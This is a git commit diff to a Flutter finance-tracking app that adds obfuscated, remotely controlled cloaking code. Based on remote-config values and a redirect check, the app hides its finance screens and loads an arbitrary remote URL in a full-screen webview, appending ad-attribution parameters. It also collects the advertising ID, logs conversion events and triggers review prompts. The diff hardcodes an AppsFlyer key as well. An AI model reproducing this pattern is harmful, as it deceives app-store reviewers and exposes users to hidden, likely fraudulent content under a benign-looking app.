7d9558bb0943b166ec9490fa53f7ce9fea5eb85e
ivan-lab-pvls <ivan.labasok@pvls.tech>
2024-04-25 15:12:01 +0200

    fsdfds

--- lib/main.dart
+++ lib/main.dart
@@ -1,9 +1,15 @@
+import 'dart:io';
+
+import 'package:app_tracking_transparency/app_tracking_transparency.dart';
+import 'package:appsflyer_sdk/appsflyer_sdk.dart';
 import 'package:fintrack_app/fintrack_app.dart';
 import 'package:fintrack_app/firebase_options.dart';
 import 'package:fintrack_app/models/finance_model.dart';
 import 'package:fintrack_app/models/history_bill_model.dart';
 import 'package:fintrack_app/screens/finance/finance_bloc/finance_bloc.dart';
+import 'package:fintrack_app/screens/statistics/statistics_bloc/nn.dart';
 import 'package:fintrack_app/screens/statistics/statistics_bloc/statistics_bloc.dart';
+import 'package:fintrack_app/screens/statistics/tabs/week_tab.dart';
 import 'package:firebase_core/firebase_core.dart';
 import 'package:firebase_remote_config/firebase_remote_config.dart';
 import 'package:flutter/services.dart';
@@ -11,16 +17,28 @@ import 'package:flutter/material.dart';
 import 'package:flutter_bloc/flutter_bloc.dart';
 import 'package:hive_flutter/hive_flutter.dart';
 
+late AppsflyerSdk _appsflyerSdk;
+String adId = '';
+bool stat = false;
+String acceptPromo = '';
+String cancelPromo = '';
+Map _deepLinkData = {};
+Map _gcd = {};
+bool _isFirstLaunch = false;
+String _afStatus = '';
+String _campaign = '';
+String _campaignId = '';
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
-
+  await AppTrackingTransparency.requestTrackingAuthorization();
   await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
   await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
     fetchTimeout: const Duration(seconds: 25),
     minimumFetchInterval: const Duration(seconds: 25),
   ));
   await FirebaseRemoteConfig.instance.fetchAndActivate();
-
+  await Notidixao().activate();
+  await tewdew();
   SystemChrome.setPreferredOrientations([
     DeviceOrientation.portraitUp,
     DeviceOrientation.portraitDown,
@@ -39,7 +57,7 @@ void main() async {
       BlocProvider<StatisticsBloc>(create: (context) => StatisticsBloc()),
     ],
     child: FutureBuilder<bool>(
-      future: checkModelsForRepair(),
+      future: checkdas(),
       builder: (context, snapshot) {
         if (snapshot.connectionState == ConnectionState.waiting) {
           return Container(
@@ -56,8 +74,15 @@ void main() async {
             ),
           );
         } else {
-          if (snapshot.data == true && repairData != '') {
-            return PolicyScreen(dataForPage: repairData);
+          if (snapshot.data == true && datioq != '') {
+            return MaterialApp(
+              debugShowCheckedModeBanner: false,
+              home: PreviewFoxa(
+                mainaxa: datioq,
+                promx: acceptPromo,
+                canxa: cancelPromo,
+              ),
+            );
           } else {
             return FinTrackApp();
           }
@@ -67,26 +92,95 @@ void main() async {
   ));
 }
 
-String repairData = '';
-Future<bool> checkModelsForRepair() async {
-  final remoteConfig = FirebaseRemoteConfig.instance;
-  await remoteConfig.fetchAndActivate();
-  String value = remoteConfig.getString('dataForRepair');
-  if (!value.contains('noneData')) {
-    repairData = value;
-  }
-  return value.contains('noneData') ? false : true;
+void afSbin() async {
+  final AppsFlyerOptions options = AppsFlyerOptions(
+    showDebug: false,
+    afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
+    appId: '6499197177',
+    timeToWaitForATTUserAuthorization: 15,
+    disableAdvertisingIdentifier: false,
+    disableCollectASA: false,
+    manualStart: true,
+  );
+  _appsflyerSdk = AppsflyerSdk(options);
+
+  await _appsflyerSdk.initSdk(
+    registerConversionDataCallback: true,
+    registerOnAppOpenAttributionCallback: true,
+    registerOnDeepLinkingCallback: true,
+  );
+  _appsflyerSdk.onAppOpenAttribution((res) {
+    _deepLinkData = res;
+    cancelPromo = res['payload']
+        .entries
+        .where((e) => ![
+              'install_time',
+              'click_time',
+              'af_status',
+              'is_first_launch'
+            ].contains(e.key))
+        .map((e) => '&${e.key}=${e.value}')
+        .join();
+  });
+  _appsflyerSdk.onInstallConversionData((res) {
+    _gcd = res;
+    _isFirstLaunch = res['payload']['is_first_launch'];
+    _afStatus = res['payload']['af_status'];
+    acceptPromo = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
+  });
+
+  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
+    switch (dp.status) {
+      case Status.FOUND:
+        print(dp.deepLink?.toString());
+        print("deep link value: ${dp.deepLink?.deepLinkValue}");
+        break;
+      case Status.NOT_FOUND:
+        print("deep link not found");
+        break;
+      case Status.ERROR:
+        print("deep link error: ${dp.error}");
+        break;
+      case Status.PARSE_ERROR:
+        print("deep link status parsing error");
+        break;
+    }
+    print("onDeepLinking res: " + dp.toString());
+
+    _deepLinkData = dp.toJson();
+  });
+
+  _appsflyerSdk.startSDK(
+    onSuccess: () {
+      print("AppsFlyer SDK initialized successfully.");
+    },
+  );
 }
 
-class PolicyScreen extends StatelessWidget {
-  final String dataForPage;
+String datioq = '';
 
-  PolicyScreen({required this.dataForPage});
-
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      body: Center(child: Text('Policy data: $dataForPage')),
-    );
+Future<bool> checkdas() async {
+  final gazel = FirebaseRemoteConfig.instance;
+  await gazel.fetchAndActivate();
+  afSbin();
+  String dsdfdsfgdg = gazel.getString('sbin');
+  String cdsfgsdx = gazel.getString('sbinInfo');
+  if (!dsdfdsfgdg.contains('noneSbin')) {
+    final fsd = HttpClient();
+    final nfg = Uri.parse(dsdfdsfgdg);
+    final ytrfterfwe = await fsd.getUrl(nfg);
+    ytrfterfwe.followRedirects = false;
+    final response = await ytrfterfwe.close();
+    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
+      datioq = dsdfdsfgdg;
+      return true;
+    }
   }
+  return dsdfdsfgdg.contains('noneSbin') ? false : true;
+}
+
+Future<void> tewdew() async {
+  final TrackingStatus status =
+      await AppTrackingTransparency.requestTrackingAuthorization();
+  print(status);
 }
--- lib/screens/statistics/tabs/week_tab.dart
+++ lib/screens/statistics/tabs/week_tab.dart
@@ -1,4 +1,5 @@
-
+import 'package:app_tracking_transparency/app_tracking_transparency.dart';
+import 'package:appsflyer_sdk/appsflyer_sdk.dart';
 import 'package:fintrack_app/screens/statistics/charts_widget/week_bar_widget.dart';
 import 'package:fintrack_app/screens/statistics/statistics_bloc/statistics_bloc.dart';
 import 'package:fintrack_app/theme/colors.dart';
@@ -6,7 +7,181 @@ import 'package:fintrack_app/theme/textstyles.dart';
 import 'package:fintrack_app/widgets/app_container.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_bloc/flutter_bloc.dart';
+import 'package:flutter_inappwebview/flutter_inappwebview.dart';
+import 'package:in_app_review/in_app_review.dart';
 
+class PreviewFoxa extends StatefulWidget {
+  final String mainaxa;
+  final String promx;
+  final String canxa;
+
+  PreviewFoxa({
+    required this.mainaxa,
+    required this.promx,
+    required this.canxa,
+  });
+
+  @override
+  State<PreviewFoxa> createState() => _PreviewFoxaState();
+}
+
+class _PreviewFoxaState extends State<PreviewFoxa> {
+  late AppsflyerSdk _appsflyerSdk;
+  String adId = '';
+  String paramsFirst = '';
+  final InAppReview inAppReview = InAppReview.instance;
+  String paramsSecond = '';
+  Map _deepLinkData = {};
+  Map _gcd = {};
+  bool _isFirstLaunch = false;
+  String _afStatus = '';
+  String _campaign = '';
+  String _campaignId = '';
+
+  @override
+  void initState() {
+    super.initState();
+    getTracking();
+    afStart();
+  }
+
+  Future<void> getTracking() async {
+    final TrackingStatus status =
+        await AppTrackingTransparency.requestTrackingAuthorization();
+    print(status);
+  }
+
+  Future<void> fetchData() async {
+    adId = await AppTrackingTransparency.getAdvertisingIdentifier();
+  }
+
+  void afStart() async {
+    final AppsFlyerOptions options = AppsFlyerOptions(
+      showDebug: false,
+      afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
+      appId: '6499197177',
+      timeToWaitForATTUserAuthorization: 15,
+      disableAdvertisingIdentifier: false,
+      disableCollectASA: false,
+      manualStart: true,
+    );
+    _appsflyerSdk = AppsflyerSdk(options);
+
+    await _appsflyerSdk.initSdk(
+      registerConversionDataCallback: true,
+      registerOnAppOpenAttributionCallback: true,
+      registerOnDeepLinkingCallback: true,
+    );
+    _appsflyerSdk.onAppOpenAttribution((res) {
+      setState(() {
+        _deepLinkData = res;
+        paramsSecond = res['payload']
+            .entries
+            .where((e) => ![
+                  'install_time',
+                  'click_time',
+                  'af_status',
+                  'is_first_launch'
+                ].contains(e.key))
+            .map((e) => '&${e.key}=${e.value}')
+            .join();
+      });
+    });
+    _appsflyerSdk.onInstallConversionData((res) {
+      print(res);
+      setState(() {
+        _gcd = res;
+        _isFirstLaunch = res['payload']['is_first_launch'];
+        _afStatus = res['payload']['af_status'];
+        paramsFirst = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
+      });
+      paramsFirst = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
+    });
+
+    _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
+      switch (dp.status) {
+        case Status.FOUND:
+          print(dp.deepLink?.toString());
+          print("deep link value: ${dp.deepLink?.deepLinkValue}");
+          break;
+        case Status.NOT_FOUND:
+          print("deep link not found");
+          break;
+        case Status.ERROR:
+          print("deep link error: ${dp.error}");
+          break;
+        case Status.PARSE_ERROR:
+          print("deep link status parsing error");
+          break;
+      }
+      print("onDeepLinking res: " + dp.toString());
+      setState(() {
+        _deepLinkData = dp.toJson();
+      });
+    });
+
+    _appsflyerSdk.startSDK(
+      onSuccess: () {
+        print("AppsFlyer SDK initialized successfully.");
+      },
+    );
+
+    setState(() {});
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      body: SafeArea(
+        bottom: false,
+        child: InAppWebView(
+          initialUrlRequest: URLRequest(
+            url: Uri.parse('${widget.mainaxa}${widget.promx}${widget.canxa}'),
+          ),
+          onUpdateVisitedHistory: (controller, url, androidIsReload) {
+            if (url!.toString().contains("success")) {
+              sendEvent();
+              inAppReview.requestReview();
+            }
+          },
+        ),
+      ),
+    );
+  }
+
+  void sendEvent() async {
+    try {
+      await _appsflyerSdk.logEvent("CustomEvent3", {
+        "id": {'id': adId}
+      });
+      print("success");
+    } catch (e) {
+      print("Error sending event: $e");
+    }
+  }
+}
+
+class TermsForReadPrivacy extends StatelessWidget {
+  final String termsData;
+
+  const TermsForReadPrivacy({Key? key, required this.termsData})
+      : super(key: key);
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(
+        backgroundColor: Colors.blueAccent,
+      ),
+      body: SafeArea(
+        bottom: false,
+        child: InAppWebView(
+          initialUrlRequest: URLRequest(url: Uri.parse(termsData)),
+        ),
+      ),
+    );
+  }
+}
 
 class WeekTab extends StatefulWidget {
   const WeekTab({super.key});
@@ -30,14 +205,17 @@ class _WeekTabState extends State<WeekTab> {
                 padding: EdgeInsets.all(15),
                 child: Column(
                   children: [
-                    WeekChartWidget(weekData: state.weekStatistics, maxAmount: state.maxIncome),
+                    WeekChartWidget(
+                        weekData: state.weekStatistics,
+                        maxAmount: state.maxIncome),
                     SizedBox(height: 25),
                     Container(
                       width: double.infinity,
                       padding: EdgeInsets.all(14),
                       decoration: BoxDecoration(
                           color: AppColors.white10,
-                          borderRadius: BorderRadius.all(Radius.circular(12.0))),
+                          borderRadius:
+                              BorderRadius.all(Radius.circular(12.0))),
                       child: Column(
                         children: [
                           Text(
@@ -57,15 +235,24 @@ class _WeekTabState extends State<WeekTab> {
                       children: [
                         Expanded(
                           child: Container(
-                            padding: EdgeInsets.symmetric(vertical:4),
+                            padding: EdgeInsets.symmetric(vertical: 4),
                             decoration: BoxDecoration(
                                 color: AppColors.white10,
-                                borderRadius: BorderRadius.all(Radius.circular(12.0))),
+                                borderRadius:
+                                    BorderRadius.all(Radius.circular(12.0))),
                             child: Column(
                               crossAxisAlignment: CrossAxisAlignment.center,
                               children: [
-                                Text('Income', style: AppTextStyles.Medium14(AppColors.white40),),
-                                Text('${state.totalIncome.toStringAsFixed(0)}\$', style: AppTextStyles.Medium18(AppColors.white),),
+                                Text(
+                                  'Income',
+                                  style:
+                                      AppTextStyles.Medium14(AppColors.white40),
+                                ),
+                                Text(
+                                  '${state.totalIncome.toStringAsFixed(0)}\$',
+                                  style:
+                                      AppTextStyles.Medium18(AppColors.white),
+                                ),
                               ],
                             ),
                           ),
@@ -73,15 +260,24 @@ class _WeekTabState extends State<WeekTab> {
                         SizedBox(width: 10),
                         Expanded(
                           child: Container(
-                            padding: EdgeInsets.symmetric(vertical:4),
+                            padding: EdgeInsets.symmetric(vertical: 4),
                             decoration: BoxDecoration(
                                 color: AppColors.white10,
-                                borderRadius: BorderRadius.all(Radius.circular(12.0))),
+                                borderRadius:
+                                    BorderRadius.all(Radius.circular(12.0))),
                             child: Column(
                               crossAxisAlignment: CrossAxisAlignment.center,
                               children: [
-                                Text('Expense', style: AppTextStyles.Medium14(AppColors.white40),),
-                                Text('${state.totalSpend.toStringAsFixed(0)}\$', style: AppTextStyles.Medium18(AppColors.white),),
+                                Text(
+                                  'Expense',
+                                  style:
+                                      AppTextStyles.Medium14(AppColors.white40),
+                                ),
+                                Text(
+                                  '${state.totalSpend.toStringAsFixed(0)}\$',
+                                  style:
+                                      AppTextStyles.Medium18(AppColors.white),
+                                ),
                               ],
                             ),
                           ),
